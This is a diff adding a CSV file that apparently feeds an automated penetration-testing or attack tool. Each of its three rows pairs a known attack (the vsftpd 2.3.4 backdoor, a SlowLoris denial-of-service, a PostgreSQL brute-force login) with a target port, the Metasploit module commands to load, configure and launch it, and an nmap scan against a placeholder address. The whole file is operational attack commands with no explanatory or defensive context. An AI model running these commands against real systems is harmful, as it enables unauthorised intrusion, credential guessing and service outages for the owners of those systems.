@@ -1,0 +1,4 @@
+attack_id,exploit_name,linked_port,use_command,set_command,exploit_command,scan_command
+0000,vsftpd 2.3.4 Smiley Face Backdoor,21,use exploit/unix/ftp/vsftpd_234_backdoor,set RHOSTS [address],exploit,nmap -sV -O [address]
+0001,SlowLoris DOS Attack,80,use auxiliary/dos/http/slowloris,set RHOST [address],run,nmap -sV -O [address]
+0002,PostgreSQL Brute Force Login,5432,use auxiliary/scanner/postgres/postgres_login,set BLANK_PASSWORDS true || set RHOSTS [address] || set STOP_ON_SUCCESS true,run,nmap -sV -O [address]
